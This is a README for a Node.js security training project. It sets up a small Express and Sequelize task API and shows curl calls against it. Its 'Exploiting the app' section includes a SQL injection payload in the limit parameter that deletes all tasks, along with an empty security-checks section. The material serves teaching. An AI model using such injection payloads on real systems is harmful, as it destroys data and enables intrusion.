# node-security-brown-bag
Scenarios for the brown bag session about secure node applications

## Setup
The following steps have been made to initialize the project:

```
npm install -g express-generator
cd node-security-brown-bag
express -f
yarn add sequelize@3.16 mysql
yarn add --dev sequelize-cli
node_modules/.bin/sequelize init
node_modules/.bin/sequelize model:create --name Task --attributes title:string
```

## API

```
# Reading all tasks
curl "http://localhost:3000/tasks"

# Reading a limited amount of tasks
curl "http://localhost:3000/tasks?limit=2"

# Creating a task
curl "http://localhost:3000/tasks" -d '{"title":"Some title"}'  -H 'content-type:application/json'
```

## Exploiting the app

```
curl "http://localhost:3000/tasks" -d '{"title":"some task"}'  -H 'content-type:application/json'
curl "http://localhost:3000/tasks" -d '{"title":"some other task"}'  -H 'content-type:application/json'
curl "http://localhost:3000/tasks" # Renders all tasks
curl "http://localhost:3000/tasks?limit=1" # Renders only a single task
curl "http://localhost:3000/tasks?limit=1;DELETE%20FROM%20tasks" # Will delete the tasks due to vulnerability
curl "http://localhost:3000/tasks" # Renders all available (aka no) tasks
```

## Security checks

```

```
